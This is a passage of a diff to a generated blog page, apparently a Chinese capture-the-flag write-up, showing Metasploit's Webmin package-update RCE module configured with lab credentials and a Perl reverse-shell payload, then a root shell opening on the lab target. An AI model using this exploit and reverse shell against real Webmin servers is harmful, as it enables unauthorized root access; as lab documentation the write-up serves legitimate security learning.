-   USERNAME   Matt             yes       Webmin Username
+   <span class="nt">----</span>       <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
+   PASSWORD   computer2008     <span class="nb">yes       </span>Webmin Password
+   Proxies                     no        A proxy chain of format <span class="nb">type</span>:host:port[,type:host:port][...]
+   RHOSTS     10.10.10.160     <span class="nb">yes       </span>The target host<span class="o">(</span>s<span class="o">)</span>, range CIDR identifier, or hosts file with syntax <span class="s1">'file:&lt;path&gt;'</span>
+   RPORT      10000            <span class="nb">yes       </span>The target port <span class="o">(</span>TCP<span class="o">)</span>
+   SSL        <span class="nb">true             </span>no        Negotiate SSL/TLS <span class="k">for </span>outgoing connections
+   TARGETURI  /                <span class="nb">yes       </span>Base path <span class="k">for </span>Webmin application
+   USERNAME   Matt             <span class="nb">yes       </span>Webmin Username
    VHOST                       no        HTTP server virtual host
 
 
-Payload options (cmd/unix/reverse_perl):
+Payload options <span class="o">(</span>cmd/unix/reverse_perl<span class="o">)</span>:
 
    Name   Current Setting  Required  Description
-   ----   ---------------  --------  -----------
-   LHOST  10.10.15.44      yes       The listen address (an interface may be specified)
-   LPORT  4444             yes       The listen port
+   <span class="nt">----</span>   <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
+   LHOST  10.10.15.44      <span class="nb">yes       </span>The listen address <span class="o">(</span>an interface may be specified<span class="o">)</span>
+   LPORT  4444             <span class="nb">yes       </span>The listen port
 
 
 Exploit target:
 
    Id  Name
-   --  ----
-   0   Webmin &lt;= 1.910
+   <span class="nt">--</span>  <span class="nt">----</span>
+   0   Webmin &lt;<span class="o">=</span> 1.910
 
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div></div>
 
 <p>设置好选项，注意 SSL 选项需要设置为 true</p>
 
-<pre><code class="language-shell">msf5 exploit(linux/http/webmin_packageup_rce) &gt; run
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre></td><td class="rouge-code"><pre>msf5 exploit<span class="o">(</span>linux/http/webmin_packageup_rce<span class="o">)</span> <span class="o">&gt;</span> run
 
-[*] Started reverse TCP handler on 10.10.14.165:9004 
-[+] Session cookie: 8269def18359f1629182b2d26b9f86ed
-[*] Attempting to execute the payload...
-[*] Command shell session 2 opened (10.10.14.165:9004 -&gt; 10.10.10.160:41404) at 2019-11-28 05:12:27 -0500
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.10.14.165:9004 
+<span class="o">[</span>+] Session cookie: 8269def18359f1629182b2d26b9f86ed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Attempting to execute the payload...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Command shell session 2 opened <span class="o">(</span>10.10.14.165:9004 -&gt; 10.10.10.160:41404<span class="o">)</span> at 2019-11-28 05:12:27 <span class="nt">-0500</span>
 
-whoami
-root
-id
-uid=0(root) gid=0(root) groups=0(root)
-ls
-root.txt
-</code></pre>
+<span class="nb">whoami
+</span>root
+<span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+<span class="nb">ls
+</span>root.txt
+</pre></td></tr></tbody></table></code></pre></div></div>
 
 <h2 id="0x05-thanks">0x05 Thanks！</h2>
 
@@ -811,6 +956,16 @@ root.txt
                         frameborder="0" scrolling="0" width="100px" height="20px"
                         src="https://ghbtns.com/github-btn.html?user=huxpro&repo=huxpro.github.io&type=star&count=true" >
                     </iframe>
+                    <br>
+                          <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+                            <span class="post-meta-item-icon">
+                              <i class="fa fa-eye"></i>
+                            </span>
+                            <span class="site-pv" title="总访问量">
+                              <span id="busuanzi_value_site_pv"></span>
+                            </span>
+                          </span>
+                      </div>
                 </p>
             </div>
         </div>
@@ -819,6 +974,9 @@ root.txt
 
 <!-- jQuery -->
 <script src="/js/jquery.min.js "></script>
+
+<!-- busuanzi -->
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
 <!-- Bootstrap Core JavaScript -->
 <!-- Currently, only navbar scroll-down effect at desktop still depends on this -->
@@ -974,6 +1132,8 @@ root.txt
 
 
 <!-- Multi-Lingual -->
+
+
 
 
     
